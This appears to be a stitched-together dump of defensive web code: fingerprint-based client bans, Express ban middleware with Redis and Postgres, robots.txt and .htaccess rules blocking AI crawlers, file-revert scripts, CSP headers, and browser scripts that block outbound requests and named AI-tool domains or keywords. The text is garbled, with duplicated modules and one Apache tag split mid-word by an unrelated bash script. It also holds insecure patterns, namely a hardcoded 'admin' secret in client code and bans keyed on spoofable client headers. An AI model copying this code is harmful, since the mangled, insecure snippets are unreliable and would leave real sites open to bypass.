  localStorage.setItem(BAN_KEY, JSON.stringify(list));
}

/* ===== Enforcement: overlay + event blocking ===== */
function showBanOverlay() {
  const ov = document.getElementById('ban-overlay');
  ov.style.display = 'flex';
  // block pointer events on body
  document.body.style.pointerEvents = 'none';
  ov.style.pointerEvents = 'auto';
}
function hideBanOverlay() {
  const ov = document.getElementById('ban-overlay');
  ov.style.display = 'none';
  document.body.style.pointerEvents = '';
}

/* Prevent common interactions when banned */
function attachGlobalBlockers() {
  function stop(e){ e.stopImmediatePropagation(); e.preventDefault(); }
  ['click','keydown','submit','pointerdown','contextmenu'].forEach(ev => {
    window.addEventListener(ev, stop, true);
  });
}

/* ===== Ban management ===== */
async function isCurrentBanned() {
  const fp = await computeFingerprint();
  const list = readBanlist();
  return list.includes(fp);
}
async function addCurrentToBanlist() {
  const fp = await computeFingerprint();
  const list = readBanlist();
  if (!list.includes(fp)) {
    list.push(fp);
    writeBanlist(list);
    // set cookie for extra persistence (expires 1 year)
    document.cookie = `site_banned=1; max-age=${60*60*24*365}; path=/; SameSite=Lax`;
    log('Added fingerprint to local banlist: ' + fp.slice(0,12) + '...');
  }
  enforceIfBanned();
}
function clearLocalBanlist() {
  writeBanlist([]);
  document.cookie = 'site_banned=; max-age=0; path=/';
  log('Cleared local banlist');
  hideBanOverlay();
}

/* ===== Attempt to register a service worker and pass ban info (works only on HTTPS/origin) ===== */
async function tryRegisterSWAndSetBan() {
  if (!('serviceWorker' in navigator)) {
    log('Service worker not supported in this environment');
    return;
  }
  try {
    // In a real deployment, /sw.js should be served from your origin and implement fetch blocking.
    const reg = await navigator.serviceWorker.register('/sw.js').catch(()=>null);
    if (!reg) { log('SW registration failed or blocked'); return; }
    const fp = await computeFingerprint();
    // send message to SW to store ban (SW must implement message handler)
    if (reg.active) {
      reg.active.postMessage({ type: 'SET_BAN', fingerprint: fp });
      log('Requested SW to set ban for fingerprint');
    } else {
      log('SW registered but not active yet');
    }
  } catch (e) {
    log('SW error: ' + e.message);
  }
}

/* ===== Enforcement check on load and periodic re-check ===== */
async function enforceIfBanned() {
  const banned = await isCurrentBanned();
  if (banned || document.cookie.includes('site_banned=1')) {
    showBanOverlay();
    attachGlobalBlockers();
    log('Client is restricted locally');
  } else {
    hideBanOverlay();
    log('Client not restricted');
  }
}

/* ===== Simple logging helper (demo only) ===== */
function log(msg) {
  const el = document.getElementById('log');
  const t = new Date().toISOString();
  el.textContent = `[${t}] ${msg}\n` + el.textContent;
  console.log(msg);
}

/* ===== UI wiring ===== */
document.getElementById('ban-me').addEventListener('click', () => {
  addCurrentToBanlist();
});
document.getElementById('clear-ban').addEventListener('click', () => {
  clearLocalBanlist();
});
document.getElementById('appeal').addEventListener('click', () => {
  alert('Appeal request recorded (demo). In production, send to server for review.');
});

/* Admin ban button (demo: requires matching secret) */
document.getElementById('admin-ban').addEventListener('click', async () => {
  const secret = document.getElementById('admin-secret').value || '';
  const adminSecret = 'admin'; // demo secret; replace with secure server-side auth
  if (secret !== adminSecret) { alert('Invalid admin secret'); return; }
  await addCurrentToBanlist();
  await tryRegisterSWAndSetBan();
});

/* Run initial enforcement and periodic checks */
enforceIfBanned();
setInterval(enforceIfBanned, 10_000); // re-check every 10s

/* Expose functions for debugging in console */
window.__banDemo = { computeFingerprint, addCurrentToBanlist, clearLocalBanlist, readBanlist };
// ban-middleware.js
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value) {
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query('SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true', [type, value]);
  if (res.rowCount) {
    const ban = res.rows[0];
    const ttl = ban.expires_at ? Math.max(0, new Date(ban.expires_at) - Date.now()) : null;
    if (ttl) await redis.setEx(key, Math.ceil(ttl/1000), JSON.stringify(ban));
    else await redis.set(key, JSON.stringify(ban));
    return ban;
  }
  return null;
}

module.exports = function banMiddleware() {
  return async function (req, res, next) {
    try {
      const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;

      const checks = [
        isBanned('ip', ip),
        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // log and block
          req.app.logger.warn({ event: 'ban_block', ip, apiKey, accountId, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }
      next();
    } catch (err) {
      next(err);
    }
  };
};
POST /admin/bans
Authorization: Bearer <admin-token>
Content-Type: application/json

{
  "subject_type":"ip",
  "subject_value":"203.0.113.45",
  "reason":"credential stuffing",
  "expires_at":"2026-03-07T12:00:00Z"
}
-- bans table
CREATE TABLE bans (
  id BIGSERIAL PRIMARY KEY,
  subject_type TEXT NOT NULL, -- 'ip'|'account'|'api_key'|'fingerprint'|'asn'|'tls_ja3'
  subject_value TEXT NOT NULL,
  reason TEXT,
  created_by TEXT,
  created_at TIMESTAMPTZ DEFAULT now(),
  expires_at TIMESTAMPTZ NULL,
  active BOOLEAN DEFAULT true
);
CREATE INDEX ON bans(subject_type, subject_value);

-- linked identities (to correlate multiple labels to one actor)
CREATE TABLE actor_links (
  id BIGSERIAL PRIMARY KEY,
  actor_id TEXT NOT NULL, -- opaque actor id (e.g., UUID)
  label_type TEXT NOT NULL, -- 'ip'|'fingerprint'|'api_key'|'account'|'asn'|'tls_ja3'
  label_value TEXT NOT NULL,
  seen_at TIMESTAMPTZ DEFAULT now()
);
CREATE INDEX ON actor_links(actor_id);
CREATE INDEX ON actor_links(label_type, label_value);
// ban-enforce.js
const redis = require('redis').createClient();
const db = require('./db'); // pg client
const { pushToEdge } = require('./edge-integration'); // pluggable

async function redisGetBan(type, value) {
  const key = `ban:${type}:${value}`;
  const raw = await redis.get(key);
  return raw ? JSON.parse(raw) : null;
}

async function dbGetBan(type, value) {
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  return res.rowCount ? res.rows[0] : null;
}

async function isBanned(type, value) {
  const cached = await redisGetBan(type, value);
  if (cached) return cached;
  const ban = await dbGetBan(type, value);
  if (ban) {
    const key = `ban:${type}:${value}`;
    if (ban.expires_at) {
      const ttl = Math.max(0, Math.floor((new Date(ban.expires_at) - Date.now()) / 1000));
      await redis.setEx(key, ttl || 1, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

function extractLabels(req) {
  const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
  const ua = req.get('user-agent') || '';
  const apiKey = req.get('x-api-key') || null;
  const accountId = req.user && req.user.id ? String(req.user.id) : null;
  const asn = req.get('x-forwarded-asn') || null;
  const tlsJa3 = req.get('x-ja3') || null; // requires edge to populate
  const fingerprint = req.get('x-device-fp') || null; // optional client-sent fingerprint
  return { ip, ua, apiKey, accountId, asn, tlsJa3, fingerprint };
}

module.exports = function banMiddleware(options = {}) {
  return async function (req, res, next) {
    try {
      const labels = extractLabels(req);
      // check high-confidence labels first
      const checks = [
        isBanned('ip', labels.ip),
        labels.apiKey ? isBanned('api_key', labels.apiKey) : null,
        labels.accountId ? isBanned('account', labels.accountId) : null,
        labels.fingerprint ? isBanned('fingerprint', labels.fingerprint) : null,
        labels.asn ? isBanned('asn', labels.asn) : null,
        labels.tlsJa3 ? isBanned('tls_ja3', labels.tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // optional: push to edge for immediate network block
          if (options.edgePush && options.edgePush.enabled) {
            pushToEdge(ban.subject_type, ban.subject_value).catch(() => {});
          }
          req.app.logger?.warn({ event: 'ban_block', labels, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      // behavioral scoring: increment actor score and escalate if threshold reached
      const actorId = req.get('x-actor-id') || null; // optional precomputed actor id
      if (actorId) {
        const scoreKey = `actor:${actorId}:score`;
        const score = await redis.incr(scoreKey);
        await redis.expire(scoreKey, 3600); // sliding window
        if (score >= (options.behaviorThreshold || 100)) {
          // create a temporary ban and push to DB + Redis
          const reason = 'behavioral threshold exceeded';
          const expiresAt = new Date(Date.now() + (options.temporaryBanSeconds || 3600) * 1000);
          await db.query(
            'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5)',
            ['actor', actorId, reason, 'auto', expiresAt]
          );
          const banObj = { subject_type: 'actor', subject_value: actorId, reason, expires_at: expiresAt };
          await redis.setEx(`ban:actor:${actorId}`, Math.ceil((expiresAt - Date.now())/1000), JSON.stringify(banObj));
          if (options.edgePush && options.edgePush.enabled) {
            pushToEdge('actor', actorId).catch(()=>{});
          }
          req.app.logger?.warn({ event: 'auto_ban', actorId, score });
          return res.status(403).json({ error: 'Access denied', reason });
        }
      }

      next();
    } catch (err) {
      next(err);
    }
  };
};
// admin-bans.js (Express routes)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider
  // await pushToEdge(subject_type, subject_value);
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  // remove from redis (best-effort)
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
  }
  res.json({ ok: true });
});

module.exports = router;
// edge-integration.js (stub)
async function pushToEdge(type, value) {
  // Implement provider-specific API calls here.
  // Example: Cloudflare IP list update, AWS WAF IPSet update, or call to your CDN purge/block API.
  // Keep idempotent and rate-limited.
  return Promise.resolve();
}
module.exports = { pushToEdge };
// correlate-worker.js (concept)
const db = require('./db');
async function correlate() {
  // find labels that co-occur in short windows and assign actor ids
  // pseudocode: for each recent request log, group labels and upsert actor_links
  // then merge actor_ids that share labels and update bans if necessary
}
setInterval(correlate, 60_000);
// ban-middleware.js (Express)
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value) {
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  if (res.rowCount) {
    const ban = res.rows[0];
    if (ban.expires_at) {
      const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
      await redis.setEx(key, ttl, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

module.exports = function banMiddleware(opts = {}) {
  return async function (req, res, next) {
    try {
      const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;
      const asn = req.get('x-forwarded-asn') || null;
      const tlsJa3 = req.get('x-ja3') || null;
      const fingerprint = req.get('x-device-fp') || null;

      const checks = [
        isBanned('ip', ip),
        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null,
        fingerprint ? isBanned('fingerprint', fingerprint) : null,
        asn ? isBanned('asn', asn) : null,
        tlsJa3 ? isBanned('tls_ja3', tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          req.app.logger?.warn({ event: 'ban_block', ip, apiKey, accountId, fingerprint, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      // Optional behavioral scoring and auto-escalation
      const actorId = req.get('x-actor-id') || null;
      if (actorId) {
        const scoreKey = `actor:${actorId}:score`;
        const score = await redis.incr(scoreKey);
        await redis.expire(scoreKey, 3600);
        if (score >= (opts.behaviorThreshold || 100)) {
          const reason = 'behavioral threshold exceeded';
          const expiresAt = new Date(Date.now() + (opts.temporaryBanSeconds || 3600) * 1000);
          await db.query(
            'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5)',
            ['actor', actorId, reason, 'auto', expiresAt]
          );
          const banObj = { subject_type: 'actor', subject_value: actorId, reason, expires_at: expiresAt };
          await redis.setEx(`ban:actor:${actorId}`, Math.ceil((expiresAt - Date.now())/1000), JSON.stringify(banObj));
          req.app.logger?.warn({ event: 'auto_ban', actorId, score });
          return res.status(403).json({ error: 'Access denied', reason });
        }
      }

      next();
    } catch (err) {
      next(err);
    }
  };
};
// admin-bans.js (Express)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider here
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
    // optional: remove from edge provider
  }
  res.json({ ok: true });
});

module.exports = router;
// admin-bans.js (Express)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider here
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
    // optional: remove from edge provider
  }
  res.json({ ok: true });
});

module.exports = router;
// ban-middleware.js
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value) {
  if (!value) return null;
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  if (res.rowCount) {
    const ban = res.rows[0];
    if (ban.expires_at) {
      const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
      await redis.setEx(key, ttl, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

module.exports = function banMiddleware(opts = {}) {
  return async function (req, res, next) {
    try {
      const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;
      const fingerprint = req.get('x-device-fp') || null;
      const asn = req.get('x-forwarded-asn') || null;
      const tlsJa3 = req.get('x-ja3') || null;

      const checks = [
        isBanned('ip', ip),
        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null,
        fingerprint ? isBanned('fingerprint', fingerprint) : null,
        asn ? isBanned('asn', asn) : null,
        tlsJa3 ? isBanned('tls_ja3', tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // signal edge to escalate (best-effort)
          if (opts.edge && opts.edge.notify) opts.edge.notify({ type: ban.subject_type, value: ban.subject_value, reason: ban.reason });
          req.app.logger?.warn({ event: 'ban_block', ip, apiKey, accountId, fingerprint, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      next();
    } catch (err) { next(err); }
  };
};
// edge-adapter.js (generic)
async function pushIpBlockToEdge(providerClient, ip, meta = {}) {
  // providerClient is a pluggable SDK for Cloudflare/AWS/GCP/etc.
  // Implement idempotent upsert: create or update an IP set entry and return ruleId for revocation.
  const ruleId = await providerClient.upsertIpSet({ ip, meta });
  return ruleId;
}

async function removeIpBlockFromEdge(providerClient, ruleId) {
  await providerClient.removeIpSetEntry(ruleId);
}

module.exports = { pushIpBlockToEdge, removeIpBlockFromEdge };
map $http_x_suspicious $to_honeypot {
  default 0;
  "1" 1;
}

server {
  listen 80;
  server_name example.com;

  location / {
    proxy_pass http://app_upstream;
  }

  location /honeypot/ {
    proxy_pass http://honeypot_upstream;
  }

  # conditional routing: if app sets header X-Suspicious: 1, rewrite to honeypot
  proxy_intercept_errors on;
  error_page 418 = @to_honeypot;
}

# In app: respond with 418 and header X-Suspicious when you want the edge to divert
// correlate-worker.js (concept)
const db = require('./db');

async function correlateRecentLogs() {
  // 1) fetch recent request logs with labels (ip, fingerprint, api_key, account)
  // 2) group by co-occurrence within short time windows
  // 3) upsert actor_links(actor_id, label_type, label_value)
  // 4) merge actor_ids that share labels and mark linked labels as suspicious
  // 5) create temporary bans for linked labels if confidence threshold reached
}
setInterval(correlateRecentLogs, 60_000);
<div id="app"></div>
# robots.txt — block common AI crawlers (example)
User-agent: GPTBot
Disallow: /

User-agent: ClaudeBot
Disallow: /

User-agent: PerplexityBot
Disallow: /

User-agent: Copilot
Disallow: /

# Allow normal search engines if desired (example)
User-agent: Googlebot
Allow: /

User-agent: *
Disallow:
location ~* \.(pdf|jpg|jpeg|png|gif|json)$ {
    add_header X-Robots-Tag "noindex, nofollow";
}
<FilesMatch "\.(pdf|jpg|png|json)$">
  Header set X-Robots-Tag "noindex, nofollow"
</FilesMatch>
/* canonical.css — canonical baseline styles */
:root {
  --brand-bg: #0b5cff;
  --brand-text: #ffffff;
  --body-font: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
}

html, body {
  height: 100%;
  margin: 0;
  font-family: var(--body-font);
  background: var(--brand-bg);
  color: var(--brand-text);
}

/* important rules to reduce accidental overrides */
* {
  box-sizing: border-box;
}

/* use !important sparingly to resist inline overrides */
header, main, footer {
  background: transparent !important;
  color: inherit !important;
}
<link id="canonical-stylesheet" rel="stylesheet" href="/css/canonical.css">

#!/usr/bin/env bash
# check-and-revert.sh — run on the server where site files are deployed
REPO_DIR="/var/www/site"
FILE="robots.txt"
cd "$REPO_DIR" || exit 1

# Fetch latest from origin (optional)
git fetch --all --quiet

# Compare deployed file to repo HEAD
if ! git diff --quiet HEAD -- "$FILE"; then
  # Revert the file to the committed version
  git checkout -- "$FILE"
  # Optionally log and notify
  echo "$(date -u) Reverted $FILE to HEAD" >> /var/log/site-reverts.log
fi
# robots.txt — example tailored to common AI crawlers
# OpenAI / GPT
User-agent: GPTBot
Disallow: /

User-agent: OAI-SearchBot
Disallow: /

# Anthropic / Claude family (training vs search may be separate)
User-agent: ClaudeBot
Disallow: /

User-agent: Claude-SearchBot
Disallow: /

User-agent: Claude-User
Disallow: /

# Perplexity
User-agent: PerplexityBot
Disallow: /

User-agent: Perplexity-User
Disallow: /

# GitHub Copilot (agentic features are separate; block generic Copilot fetchers)
User-agent: Copilot
Disallow: /

# Default: allow major search engines if you want them to index
User-agent: Googlebot
Allow: /

User-agent: *
Disallow:
SetEnvIfNoCase User-Agent "GPTBot" bad_bot
SetEnvIfNoCase User-Agent "ClaudeBot" bad_bot
SetEnvIfNoCase User-Agent "PerplexityBot" bad_bot
SetEnvIfNoCase User-Agent "Copilot" bad_bot

<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{ENV:bad_bot} =1
  RewriteRule .* - [F]
</IfModule>

<FilesMatch "\.(pdf|jpg|png|json)$">
  Header set X-Robots-Tag "noindex, nofollow"
</File#!/usr/bin/env bash
# /usr/local/bin/check-and-revert.sh
REPO_DIR="/var/www/site"
FILES=("robots.txt" "css/canonical.css")
LOG="/var/log/site-reverts.log"
cd "$REPO_DIR" || exit 1
git fetch --all --quiet

for f in "${FILES[@]}"; do
  if ! git diff --quiet HEAD -- "$f"; then
    DIFF=$(git --no-pager diff -- "$f")
    git checkout -- "$f"
    echo "$(date -u) Reverted $f. Diff: $DIFF" >> "$LOG"
    # send alert (example using logger; replace with your alerting)
    logger -t site-revert "Reverted $f; see $LOG"
  fi
done
sMatch>
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-<RANDOM_NONCE>' https://trusted.cdn.example;
  style-src 'self' https://trusted.cdn.example 'unsafe-inline' ;
  connect-src 'self';
  img-src 'self' data:;
  frame-ancestors 'none';
  base-uri 'self';
  object-src 'none';
  upgrade-insecure-requests;
  report-uri /csp-report-endpoint

<link rel="stylesheet" href="https://trusted.cdn.example/app.css"
      integrity="sha384-BASE64HASH" crossorigin="anonymous">
<script src="https://trusted.cdn.example/app.js"
        integrity="sha384-BASE64HASH" crossorigin="anonymous" nonce="abc123">
        // security.js

(function ModularProtectionProtocol() {

    "use strict";

    const AUTHORIZED_MODULES = new Set([
        "core-module",
        "auth-module",
        "ui-module"
    ]);

    const BLOCKED_KEYWORDS = [
        "shadow",
        "inject",
        "eval",
        "Function(",
        "setTimeout(",
        "setInterval("
    ];

    // 🔍 Scan for unauthorized modules
    function scanModules() {
        document.querySelectorAll("[data-module]").forEach(el => {
            const name = el.dataset.module;

            if (!AUTHORIZED_MODULES.has(name)) {
                console.warn("Unauthorized module removed:", name);
                el.remove();
            }
        });
    }

    // 🚫 Block inline script injection attempts
    function interceptDynamicScripts() {
        const observer = new MutationObserver(mutations => {
            mutations.forEach(m => {
                m.addedNodes.forEach(node => {
                    if (node.tagName === "SCRIPT") {
                        console.warn("Dynamic script blocked.");
                        node.remove();
                    }
                });
            });
        });

        observer.observe(document.documentElement, {
            childList: true,
            subtree: true
        });
    }

    // 🛑 Shadow-self inhibitor
    function neutralizeShadowPatterns() {
        const allElements = document.querySelectorAll("*");

        allElements.forEach(el => {
            const html = el.outerHTML;

            BLOCKED_KEYWORDS.forEach(keyword => {
                if (html.includes(keyword)) {
                    console.warn("Shadow/self-injection pattern removed.");
                    el.remove();
                }
            });
        });
    }

    // 🔐 Disable dangerous globals
    window.eval = function() {
        throw new Error("eval() prohibited by Modular Protection Protocol.");
    };

    window.Function = function() {
        throw new Error("Dynamic Function() constructor blocked.");
    };

    // 🚨 Disable inline JS attributes
    function removeInlineHandlers() {
        document.querySelectorAll("*").forEach(el => {
            [...el.attributes].forEach(attr => {
                if (attr.name.startsWith("on")) {
                    el.removeAttribute(attr.name);
                }
            });
        });
    }

    // 🚦 Runtime Integrity Check
    function integrityCheck() {
        if (window.top !== window.self) {
            console.warn("Framing attempt blocked.");
            window.top.location = window.self.location;
        }
    }

    // 🧠 Initialize Protection System
    function initialize() {
        integrityCheck();
        scanModules();
        interceptDynamicScripts();
        neutralizeShadowPatterns();
        removeInlineHandlers();
        console.log("Modular Protection Protocol: ACTIVE");
    }

    document.addEventListener("DOMContentLoaded", initialize);

})();
BLOCK OUTBOUND DOMAIN chat.openai.com
BLOCK OUTBOUND DOMAIN copilot.microsoft.com
BLOCK OUTBOUND DOMAIN perplexity.ai
BLOCK OUTBOUND DOMAIN claude.ai
// ai-blocker.js

(function AIAccessRestriction() {

    const BLOCKED_DOMAINS = [
        "chat.openai.com",
        "copilot.microsoft.com",
        "perplexity.ai",
        "claude.ai",
        "anthropic.com"
    ];

    function blockExternalNavigation() {
        document.addEventListener("click", function(e) {
            const link = e.target.closest("a");
            if (!link) return;

            const url = new URL(link.href);

            if (BLOCKED_DOMAINS.includes(url.hostname)) {
                e.preventDefault();
                alert("Access to AI tools is restricted by system policy.");
            }
        });
    }

    function blockWindowOpen() {
        const originalOpen = window.open;
        window.open = function(url, ...args) {
            if (url) {
                const parsed = new URL(url, window.location.origin);
                if (BLOCKED_DOMAINS.includes(parsed.hostname)) {
                    console.warn("Blocked AI tool attempt:", parsed.hostname);
                    return null;
                }
            }
            return originalOpen.apply(this, [url, ...args]);
        };
    }

    blockExternalNavigation();
    blockWindowOpen();

    console.log("AI Access Restriction Active");

})();
// secure.js

(function ExternalProtocolGuard() {

    "use strict";

    const BLOCKED_PATTERNS = [
        "telemetry",
        "tracking",
        "analytics",
        "beacon",
        "collect",
        "monitor"
    ];

    const BLOCKED_DOMAINS = [
        "gov",
        "mil",
        "tracking",
        "analytics"
    ];

    // 🚫 Block fetch/XHR to suspicious domains
    const originalFetch = window.fetch;
    window.fetch = function(resource, options) {

        const url = typeof resource === "string"
            ? resource
            : resource.url;

        if (BLOCKED_DOMAINS.some(d => url.includes(d))) {
            console.warn("Blocked outbound request:", url);
            return Promise.reject("Outbound request blocked.");
        }

        return originalFetch.apply(this, arguments);
    };

    // 🚫 Block XMLHttpRequest
    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {

        if (BLOCKED_DOMAINS.some(d => url.includes(d))) {
            console.warn("Blocked XHR request:", url);
            return;
        }

        return originalOpen.apply(this, arguments);
    };

    // 🧹 Remove suspicious DOM nodes
    function cleanDOM() {
        document.querySelectorAll("*").forEach(el => {
            const html = el.outerHTML.toLowerCase();

            BLOCKED_PATTERNS.forEach(pattern => {
                if (html.includes(pattern)) {
                    console.warn("Removed suspicious element:", pattern);
                    el.remove();
                }
            });
        });
    }

    // 🚫 Disable sendBeacon
    if (navigator.sendBeacon) {
        navigator.sendBeacon = function() {
            console.warn("sendBeacon blocked.");
            return false;
        };
    }

    // 🛡 Prevent iframe injection dynamically
    const observer = new MutationObserver(mutations => {
        mutations.forEach(m => {
            m.addedNodes.forEach(node => {
                if (node.tagName === "IFRAME") {
                    console.warn("Iframe blocked.");
                    node.remove();
                }
            });
        });
    });

    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });

    document.addEventListener("DOMContentLoaded", cleanDOM);

    console.log("External Protocol Guard ACTIVE");

})();
(function SovereignMode() {

    "use strict";

    // Disable fetch
    window.fetch = function() {
        throw new Error("Outbound connections disabled.");
    };

    // Disable XMLHttpRequest
    XMLHttpRequest.prototype.open = function() {
        throw new Error("XHR disabled.");
    };

    // Disable sendBeacon
    if (navigator.sendBeacon) {
        navigator.sendBeacon = function() {
            return false;
        };
    }

    console.log("System operating in SOVEREIGN LOCAL MODE.");

})();
// browser-lockdown.js

(function BrowserIsolationMode() {
    "use strict";

    const originalFetch = window.fetch;
    window.fetch = function(resource, options) {
        console.warn("Blocked fetch attempt:", resource);
        return Promise.reject("Outbound fetch blocked.");
    };

    XMLHttpRequest.prototype.open = function() {
        console.warn("Blocked XHR request.");
        throw new Error("XHR disabled.");
    };

    if (navigator.sendBeacon) {
        navigator.sendBeacon = function() {
            console.warn("sendBeacon blocked.");
            return false;
        };
    }

    const originalOpen = window.open;
    window.open = function() {
        console.warn("Popup blocked.");
        return null;
    };

    console.log("Browser Isolation Mode ACTIVE.");
})();
(function DOMSanitizer() {

    const suspiciousKeywords = [
        "tracker",
        "telemetry",
        "analytics",
        "beacon",
        "collect",
        "fingerprint"
    ];

    function cleanDOM() {
        document.querySelectorAll("*").forEach(el => {
            const html = el.outerHTML.toLowerCase();
            suspiciousKeywords.forEach(keyword => {
                if (html.includes(keyword)) {
                    console.warn("Removed suspicious element:", keyword);
                    el.remove();
                }
            });
        });
    }

    const observer = new MutationObserver(cleanDOM);

    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });

    document.addEventListener("DOMContentLoaded", cleanDOM);

})();
<meta http-equiv="Content-Security-Policy"
content="
default-src 'self';
connect-src 'self';
script-src 'self';
img-src 'self';
object-src 'none';
frame-ancestors 'none';
form-action 'self';
">(function ModuleDiagnostic() {


    console.log("Starting module integrity check...");

    try {
        import("./your-module.js")
            .then(() => {
                console.log("Module loaded successfully.");
            })
            .catch(err => {
                console.error("Module blocked or failed:", err);
            });
    } catch (e) {
        console.error("Dynamic import not permitted:", e);
    }

})();
(function PolicyCheck(){
    if (navigator.userAgent.includes("Managed")) {
        console.warn("Device may be under enterprise policy.");
    }
})();
// Simulated inhibitor module state (client-side only)
const state = {
